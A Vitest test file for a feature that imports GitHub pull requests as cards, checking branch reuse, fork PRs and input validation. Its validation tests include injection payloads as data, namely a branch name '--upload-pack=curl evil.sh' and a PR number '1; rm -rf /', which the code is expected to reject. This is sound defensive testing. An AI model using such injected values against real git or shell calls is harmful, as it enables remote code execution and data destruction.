/**
 * @vitest-environment node
 *
 * The decisions behind "open a card from this PR" (CGLAB-177).
 *
 * Written before the route, because every case worth getting right here is a
 * case that is miserable to reproduce against a real GitHub: a PR from a fork,
 * a merged PR whose branch was deleted, a branch that already has a card. Each
 * of those is one object literal below.
 */
import { describe, it, expect } from 'vitest';
import {
  planPrImport, descriptionFor, isValidPrNumber, isUsableBranchName,
  type PullRequestSummary,
} from '../prImport';

const pr = (over: Partial<PullRequestSummary> = {}): PullRequestSummary => ({
  number: 42,
  title: 'Make the thing faster',
  body: 'Caches the lookup.',
  url: 'https://github.com/acme/app/pull/42',
  headRefName: 'feat/faster-lookup',
  state: 'OPEN',
  isCrossRepository: false,
  ...over,
});

describe('a PR that has no card yet', () => {
  it('becomes a card carrying the PR title and a link back', () => {
    const plan = planPrImport(pr(), []);
    expect(plan.action).toBe('create');
    if (plan.action !== 'create') throw new Error('unreachable');
    expect(plan.title).toBe('Make the thing faster');
    expect(plan.externalId).toBe('42');
    expect(plan.externalUrl).toBe('https://github.com/acme/app/pull/42');
    expect(plan.branchName).toBe('feat/faster-lookup');
  });

  it('fetches the branch, so the worktree can be made from it', () => {
    const plan = planPrImport(pr(), []);
    if (plan.action !== 'create') throw new Error('unreachable');
    expect(plan.worktree.attempt).toBe(true);
  });
});

describe('the description', () => {
  it('is the body plus the link, and nothing else', () => {
    // Comments and reviews deliberately excluded: they go on changing on
    // GitHub, and a snapshot of them inside a card is a second copy nobody
    // will ever update.
    const text = descriptionFor(pr({ body: 'Caches the lookup.' }));
    expect(text).toContain('Caches the lookup.');
    expect(text).toContain('https://github.com/acme/app/pull/42');
  });

  it('is just the link when the PR has no body', () => {
    // Not "no description provided". The link is already there, and a card
    // whose description apologises is worse than one that says nothing.
    expect(descriptionFor(pr({ body: '' }))).toBe('PR #42: https://github.com/acme/app/pull/42');
  });

  it('survives a PR whose body is missing rather than empty', () => {
    expect(descriptionFor(pr({ body: undefined as unknown as string })))
      .toBe('PR #42: https://github.com/acme/app/pull/42');
  });
});

describe('a branch that already has a card', () => {
  it('opens that card instead of making a second one', () => {
    // Git allows one worktree per branch. A second card on the same branch is
    // not a duplicate to tidy up later — it is a failure scheduled for later.
    const plan = planPrImport(pr(), [
      { id: 'card-1', title: 'Speed up lookups', branchName: 'feat/faster-lookup' },
    ]);
    expect(plan.action).toBe('reuse');
    if (plan.action !== 'reuse') throw new Error('unreachable');
    expect(plan.itemId).toBe('card-1');
    expect(plan.reason).toContain('one worktree per branch');
  });

  it('matches on the branch, not on the PR number', () => {
    // A card made by `From Branch` before the PR existed has no PR number on
    // it and is still the same work.
    const plan = planPrImport(pr(), [
      { id: 'card-1', title: 'Started before the PR', branchName: '  feat/faster-lookup  ' },
    ]);
    expect(plan.action).toBe('reuse');
  });

  it('does not treat two cards with no branch as a match', () => {
    // The trap in matching on a field that is usually empty: every card
    // without a branch would collide with every other one.
    const plan = planPrImport(pr({ headRefName: '' }), [
      { id: 'card-1', title: 'Unrelated', branchName: null },
      { id: 'card-2', title: 'Also unrelated' },
    ]);
    expect(plan.action).toBe('create');
  });
});

describe('a PR from a fork', () => {
  it('still becomes a card', () => {
    const plan = planPrImport(pr({ isCrossRepository: true }), []);
    expect(plan.action).toBe('create');
  });

  it('does not try to fetch a branch that is not on our remote', () => {
    // Spending a round trip to produce an error already known is worse than
    // saying so.
    const plan = planPrImport(pr({ isCrossRepository: true }), []);
    if (plan.action !== 'create') throw new Error('unreachable');
    expect(plan.worktree.attempt).toBe(false);
    expect(plan.worktree.reason).toContain('fork');
  });
});

describe('a merged or closed PR', () => {
  it('still tries, because the branch may well still be there', () => {
    // Refusing on the state would be guessing at the remote instead of asking
    // it. Deleted-on-merge is common, not universal — and when it is gone the
    // fetch says so, which is a better answer than a guess.
    for (const state of ['MERGED', 'CLOSED']) {
      const plan = planPrImport(pr({ state }), []);
      if (plan.action !== 'create') throw new Error('unreachable');
      expect(plan.worktree.attempt, `state ${state}`).toBe(true);
    }
  });
});

describe('what it refuses to hand to git', () => {
  it('a branch name that would be read as an option', () => {
    const plan = planPrImport(pr({ headRefName: '--upload-pack=curl evil.sh' }), []);
    if (plan.action !== 'create') throw new Error('unreachable');
    expect(plan.worktree.attempt).toBe(false);
  });

  it('branch names git itself rejects', () => {
    for (const bad of ['a..b', 'a b', 'ref@{0}', '/leading', 'trailing/', 'x.lock', 'q?', 'star*', 'car^', 'co:lon', 'back\\slash']) {
      expect(isUsableBranchName(bad), `should refuse ${JSON.stringify(bad)}`).toBe(false);
    }
  });

  it('accepts the ordinary ones', () => {
    for (const good of ['main', 'feat/faster-lookup', 'fix/CGLAB-177_pr-import', 'release-1.2.3']) {
      expect(isUsableBranchName(good), `should accept ${good}`).toBe(true);
    }
  });

  it('a PR number that is not a positive integer', () => {
    // The number is interpolated into a `gh` shellout. The issue importer
    // carries a comment naming the bug this was (4c939916); the lesson is not
    // that issues need it, it is that anything reaching argv does.
    // `true` and `1e21` are the two that got through the first version:
    // `Number(true)` is 1, so `{prNumber: true}` imported PR #1, and
    // `Number('1e21')` is an integer that stringifies back as "1e+21".
    for (const bad of ['1; rm -rf /', '-1', '0', '1.5', '', null, undefined, {}, 'abc', NaN, true, false, '1e21', 1e21, [42]]) {
      expect(isValidPrNumber(bad), `should refuse ${JSON.stringify(bad)}`).toBe(false);
    }
  });

  it('accepts a real PR number, as a string or a number', () => {
    // `gh` prints it as a number, a URL path gives it as a string.
    expect(isValidPrNumber(42)).toBe(true);
    expect(isValidPrNumber('42')).toBe(true);
  });
});
